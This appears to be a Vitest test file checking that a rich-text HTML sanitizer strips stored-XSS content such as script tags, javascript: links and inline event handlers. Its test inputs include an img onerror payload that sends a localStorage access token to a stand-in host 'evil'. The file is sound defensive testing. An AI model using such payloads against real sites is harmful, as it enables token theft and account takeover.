import { describe, it, expect } from 'vitest'
import { sanitizeRichText } from '../src/services/htmlSanitizer'

// Guards H2: message bodies are rendered with dangerouslySetInnerHTML in the
// parent app, so anything that can execute must be stripped before storage.
describe('sanitizeRichText (H2 stored-XSS guardrail)', () => {
  it('removes <script> blocks', () => {
    const out = sanitizeRichText('<p>hello</p><script>alert(1)</script>')
    expect(out).toContain('<p>hello</p>')
    expect(out).not.toContain('<script')
    expect(out.toLowerCase()).not.toContain('alert(1)')
  })

  it('neutralises the exact reported token-exfiltration payload', () => {
    const payload = `<img src=x onerror="fetch('//evil/?t='+localStorage.accessToken)">`
    const out = sanitizeRichText(payload)
    expect(out.toLowerCase()).not.toContain('onerror')
    expect(out.toLowerCase()).not.toContain('localstorage')
    expect(out.toLowerCase()).not.toContain('fetch(')
  })

  it('drops javascript: hrefs but keeps safe links (with a hardened rel)', () => {
    expect(sanitizeRichText('<a href="javascript:alert(1)">x</a>').toLowerCase())
      .not.toContain('javascript:')

    const safe = sanitizeRichText('<a href="https://example.com">visit</a>')
    expect(safe).toContain('href="https://example.com"')
    expect(safe).toContain('rel="noopener noreferrer nofollow"')
  })

  it('strips inline event handlers while preserving formatting', () => {
    const out = sanitizeRichText('<p onclick="steal()"><strong>bold</strong> and <em>italic</em></p><ul><li>item</li></ul>')
    expect(out.toLowerCase()).not.toContain('onclick')
    expect(out.toLowerCase()).not.toContain('steal')
    expect(out).toContain('<strong>bold</strong>')
    expect(out).toContain('<li>item</li>')
  })

  it('returns an empty string for non-string input', () => {
    // @ts-expect-error deliberately exercising the runtime guard
    expect(sanitizeRichText(null)).toBe('')
    // @ts-expect-error deliberately exercising the runtime guard
    expect(sanitizeRichText(undefined)).toBe('')
  })
})
